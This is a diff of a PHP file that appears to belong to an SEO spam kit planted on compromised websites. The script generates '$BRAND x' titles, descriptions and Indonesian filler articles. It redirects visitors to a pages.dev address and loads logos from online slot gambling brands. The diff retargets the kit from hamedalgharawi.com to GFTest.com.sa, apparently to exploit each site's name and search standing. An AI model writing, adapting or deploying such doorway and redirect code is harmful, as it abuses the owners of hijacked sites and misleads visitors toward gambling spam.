@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x Hamed Al Gharawi: Profil dan Kehadiran Digital di Era Modern";
+    $title = "$BRAND x GFTest.com.sa – Informasi Pengujian, Teknologi, dan Solusi Profesional";
 
-    $description = "$BRAND x Kenali Hamed Al Gharawi melalui informasi mengenai profil, aktivitas, perkembangan digital, profesionalisme, dan pentingnya membangun identitas online.";
+    $description = "$BRAND x GFTest.com.sa menghadirkan informasi mengenai pengujian, teknologi, layanan profesional, standar kualitas, dan solusi modern untuk kebutuhan industri.";
     
-    $artikel = "$BRAND x Hamed Al Gharawi merupakan nama yang menjadi fokus dari platform digital hamedalgharawi.com. Di era internet yang semakin berkembang, keberadaan sebuah website dapat menjadi sarana untuk menyajikan informasi secara terstruktur sekaligus membangun identitas digital yang mudah ditemukan oleh masyarakat.";
+    $artikel = "$BRAND x GFTest.com.sa merupakan platform digital yang dapat menjadi sumber informasi mengenai pengujian, teknologi, kualitas, dan berbagai kebutuhan profesional di lingkungan industri modern. Perkembangan teknologi membuat proses pengujian semakin penting untuk memastikan produk, material, sistem, maupun proses memenuhi persyaratan yang telah ditentukan.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/b7/48/3c/b7483c39cc373ad63b0583e232e835eb.jpg";
+    $image = "https://i.pinimg.com/1200x/c5/e9/8c/c5e98cf5580d81007baf8b0c7e005076.jpg";
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://hamedalgharawi.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://gftest.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
